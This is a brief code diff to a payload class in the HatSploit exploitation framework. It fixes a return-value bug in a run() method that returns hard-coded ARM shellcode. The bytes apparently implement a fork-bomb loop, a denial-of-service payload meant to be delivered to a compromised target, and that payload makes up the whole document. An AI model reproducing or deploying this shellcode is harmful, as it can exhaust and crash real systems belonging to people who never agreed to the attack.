@@ -27,9 +27,7 @@ class HatSploitPayload(Payload, HatVenom):
     }
 
     def run(self):
-        shellcode = (
+        return (
             b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7f\x40"
             b"\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff"
         )
-
-        return payload
